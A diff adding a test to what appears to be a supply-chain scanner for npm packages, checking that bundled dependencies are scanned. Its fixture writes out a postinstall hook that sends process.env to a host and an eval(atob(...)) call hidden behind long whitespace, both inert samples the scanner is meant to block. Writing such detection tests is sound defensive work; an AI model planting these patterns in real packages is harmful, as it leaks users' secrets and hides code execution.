@@ -70,6 +70,24 @@ describe("contentFindings", () => {
     expect(findings).toEqual([]);
   });
 
+  it("checks bundled dependencies like the package itself (npm runs their scripts)", () => {
+    const findings = scan({
+      "package.json": manifest({}),
+      "node_modules/@s/helper/package.json": manifest({
+        postinstall: "node collect.js",
+      }),
+      "node_modules/@s/helper/collect.js":
+        'fetch("http://localhost:9", { body: JSON.stringify(process.env) });',
+      "node_modules/inner/lib.js": `x();${" ".repeat(300)}eval(atob("eA=="));`,
+    });
+    expect(findings.map((f) => `${f.severity}:${f.ruleId}:${f.file}`)).toEqual(
+      expect.arrayContaining([
+        "block:repo/lifecycle-script:x@1.0.0/node_modules/@s/helper/package.json",
+        "block:repo/hidden-code:x@1.0.0/node_modules/inner/lib.js",
+      ]),
+    );
+  });
+
   it("blocks hidden and obfuscated code inside the package", () => {
     expect(
       scan({
